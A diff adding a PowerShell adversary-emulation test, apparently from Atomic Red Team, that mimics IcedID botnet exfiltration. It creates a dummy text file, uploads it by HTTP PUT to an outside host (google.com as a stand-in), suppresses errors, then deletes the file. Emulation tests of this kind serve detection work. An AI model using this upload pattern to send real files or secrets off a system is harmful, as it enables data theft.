@@ -1,0 +1,14 @@
+#TechniqueName: Automated Exfiltration
+#AtomicTestName: IcedID Botnet HTTP PUT
+#Language: ps1
+
+#commands
+$fileName = "C:\temp\T1020_exfilFile.txt"
+$url = "https://google.com"
+$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
+$contentType = "application/octet-stream"
+try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+
+#cleanup_commands
+$fileName = "C:\temp\T1020_exfilFile.txt"
+Remove-Item -Path $fileName -ErrorAction Ignore
